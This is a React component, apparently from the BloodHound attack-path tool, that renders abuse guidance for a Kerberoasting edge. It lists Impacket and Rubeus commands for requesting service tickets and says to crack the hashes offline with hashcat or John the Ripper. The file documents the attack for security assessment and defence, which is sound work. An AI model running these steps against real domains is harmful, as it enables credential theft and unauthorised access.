// Copyright 2026 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from 'doodle-ui';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const Abuse: FC<EdgeInfoProps> = ({ targetName }) => {
    return (
        <>
            <Typography variant='body2'>
                From any domain-joined host or with valid domain credentials, request a service ticket for the SPN of{' '}
                {targetName} and export it for offline cracking. With Impacket:
            </Typography>

            <Typography component={'pre'}>GetUserSPNs.py -request -dc &lt;DC&gt; -target-user {targetName} DOMAIN/user:pass</Typography>

            <Typography variant='body2'>Or from a Windows session with a domain context:</Typography>

            <Typography component={'pre'}>Rubeus.exe kerberoast /user:{targetName} /outfile:hashes.txt</Typography>

            <Typography variant='body2'>
                Crack the extracted <Typography component={'pre'}>{'"$krb5tgs$23$..."'}</Typography> hash offline with
                hashcat mode 13100 or John the Ripper, then authenticate as the service account and enumerate its
                privileges.
            </Typography>
        </>
    );
};

export default Abuse;
